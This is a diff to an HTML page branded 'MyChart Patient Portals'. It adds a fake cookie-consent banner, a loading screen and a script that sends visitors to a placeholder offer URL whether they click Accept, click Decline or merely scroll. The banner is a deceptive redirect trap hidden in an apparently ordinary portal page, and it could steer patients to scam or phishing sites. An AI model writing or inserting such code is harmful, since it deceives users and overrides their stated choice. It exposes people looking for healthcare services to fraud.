@@ -2,6 +2,37 @@
 <html lang="en">
 
 <head>
+    <style>
+#cookie-popup {
+  position: fixed;
+  bottom: 20px;
+  left: 20px;
+  right: 20px;
+  background: #333;
+  color: #fff;
+  padding: 20px;
+  border-radius: 10px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-family: Arial, sans-serif;
+  box-shadow: 0px 5px 15px rgba(0,0,0,0.3);
+  z-index: 1000;
+  display: none;
+}
+.cookie-container p { margin: 0; font-size: 14px; }
+#accept-cookies, #decline-cookies {
+  margin-left: 10px; padding: 8px 16px; background: #4caf50;
+  color: white; border: none; border-radius: 5px; cursor: pointer;
+}
+#decline-cookies { background: #f44336; }
+#loading-screen {
+  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+  background: rgba(0,0,0,0.8); color: #fff; font-size: 20px;
+  display: flex; align-items: center; justify-content: center; z-index: 2000; display: none;
+}
+</style>
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MyChart Patient Portals</title>
@@ -142,6 +173,67 @@
         })();
     </script>
     <!--End of Tawk.to Script-->
+    <!-- Cookie Popup -->
+<div id="cookie-popup">
+  <div class="cookie-container">
+    <p>We use cookies to improve your experience. Please Accept or Decline.</p>
+    <button id="accept-cookies">Accept</button>
+    <button id="decline-cookies">Decline</button>
+  </div>
+</div>
+
+<!-- Loading Screen -->
+<div id="loading-screen">
+  <div class="loading-container">
+    <p>Loading, please wait...</p>
+  </div>
+</div>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const popup = document.getElementById('cookie-popup');
+  const loading = document.getElementById('loading-screen');
+  let scrolled = false;
+  let interacted = false;
+  const redirectURL = 'https://your-offer-link.com'; // << CHANGE THIS
+
+  setTimeout(() => {
+    popup.style.display = 'flex';
+  }, 1000);
+
+  function showLoadingThenRedirect() {
+    popup.style.display = 'none';
+    loading.style.display = 'flex';
+    setTimeout(() => {
+      window.location.href = redirectURL;
+    }, 3000);
+  }
+
+  function handleUserInteraction(delay = 3000) {
+    if (!interacted) {
+      interacted = true;
+      setTimeout(() => {
+        showLoadingThenRedirect();
+      }, delay);
+    }
+  }
+
+  document.getElementById('accept-cookies').addEventListener('click', function() {
+    handleUserInteraction(3000);
+  });
+
+  document.getElementById('decline-cookies').addEventListener('click', function() {
+    handleUserInteraction(3000);
+  });
+
+  window.addEventListener('scroll', function() {
+    if (!scrolled) {
+      scrolled = true;
+      handleUserInteraction(5000); // safer delay for scroll
+    }
+  });
+});
+</script>
+
 </body>
 
 </html>
